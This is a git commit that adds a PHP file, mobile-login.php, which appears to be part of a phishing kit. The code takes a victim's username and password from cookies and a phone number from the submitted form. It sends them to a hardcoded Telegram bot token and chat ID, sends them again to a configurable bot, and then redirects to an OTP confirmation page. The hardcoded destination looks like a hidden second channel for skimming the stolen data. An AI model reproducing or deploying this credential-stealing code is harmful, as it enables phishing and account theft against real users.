90c66729cafbc5cbbbdccb308e2d2716369b3c08
hubad666 <100355242+hubad666@users.noreply.github.com>
2022-02-24 20:46:46 +0800

    Create mobile-login.php

---
+++ mobile-login.php
@@ -0,0 +1,14 @@
+$data = [
+'chat_id' => "-635799224",
+'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
+];
+file_get_contents("https://api.telegram.org/bot5202228547:AAHRkzQNW1feHYhwmhZrAdHGnYHmmLXcE_8/sendMessage?" . http_build_query($data));
+
+
+$data = [
+'chat_id' => $chat_id,
+'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_POST['number']
+];
+file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
+
+header("Location: index.php?otp=confirm");
